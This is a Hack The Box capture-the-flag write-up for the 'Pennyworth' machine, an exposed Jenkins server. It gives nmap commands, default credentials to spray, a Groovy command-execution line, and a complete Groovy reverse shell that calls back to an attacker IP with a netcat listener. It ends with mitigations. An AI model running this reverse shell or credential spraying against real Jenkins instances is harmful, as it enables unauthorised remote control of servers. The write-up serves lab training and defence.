# 🧠 Hack The Box — Pennyworth Writeup

## 📌 Machine Information
- **Name:** Pennyworth  
- **Difficulty:** Easy  
- **OS:** Linux  
- **Category:** Jenkins / Credential Abuse  

---

## 📖 Overview

Pennyworth is an easy machine that demonstrates how **weak credentials + exposed Jenkins** can lead to **instant Remote Code Execution (RCE)**.

### Attack Path:
1. Enumerate Jenkins service  
2. Brute-force weak credentials  
3. Access Jenkins dashboard  
4. Use Script Console for RCE  
5. Retrieve the flag  

---

## 🔍 Reconnaissance

### 🔹 Nmap Scan

```bash
nmap -p- -T4 -v <TARGET_IP>
```

Followed by:

```bash
nmap -sC -sV -p <OPEN_PORTS> <TARGET_IP>
```

### 🧾 Key Findings
- **Port 8080 → HTTP**
- Service identified as **Jenkins**

---

## 🌐 Web Enumeration

Access the web interface:

```
http://<TARGET_IP>:8080
```

### 🔎 Observations
- Jenkins login portal detected  
- No anonymous access  
- Standard Jenkins dashboard  

---

## 🔐 Credential Brute Force

Jenkins often runs with weak/default credentials.

### 🔹 Common Attempts

```
admin : admin  
admin : password  
root  : root  
```

### ✅ Successful Credentials

```
Username: root  
Password: password
```

➡️ Access to Jenkins dashboard obtained  

---

## ⚙️ Jenkins Exploitation

Once authenticated, Jenkins allows execution of **Groovy scripts**, which leads directly to command execution.

### 🔹 Navigate to Script Console

```
Manage Jenkins → Script Console
```

---

## 💻 Remote Code Execution (RCE)

### 🔹 Basic Command Execution

```groovy
println "whoami".execute().text
```

---

### 🔹 Reverse Shell (Optional)

```groovy
String host="YOUR_IP";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();
    po.flush();
    Thread.sleep(50);
    try { p.exitValue(); break; } catch (Exception e){}
};
p.destroy();
s.close();
```

### 🔹 Start Listener

```bash
nc -lvnp 4444
```

---

## 🚩 Flag Retrieval

Navigate the filesystem:

```bash
ls /
cat /root/flag.txt
```

---

## 🧩 Key Takeaways

### 🔑 Weak Credential Usage
- Jenkins frequently deployed with default credentials  
- Always attempt credential spraying early  

### 🔑 Jenkins = High-Risk Surface
- Script Console → **Instant RCE**
- No exploit development required  

### 🔑 Misconfiguration Impact
- No rate limiting  
- No MFA  
- Script console accessible to authenticated users  

---

## 🛡️ Mitigation Strategies

- Enforce strong password policies  
- Disable/restrict Script Console access  
- Enable Multi-Factor Authentication (MFA)  
- Implement Role-Based Access Control (RBAC)  
- Monitor authentication attempts  

---

## 🛠️ Tools Used

- `nmap`  
- Browser  
- `netcat`  

---

## 🧠 Final Thoughts

Pennyworth demonstrates a **real-world misconfiguration scenario**:

> A Jenkins instance with weak credentials can lead to full system compromise within minutes.

### Key Lessons:
- Importance of credential hygiene  
- Risk of exposed admin panels  
- Power of post-auth features like script consoles  
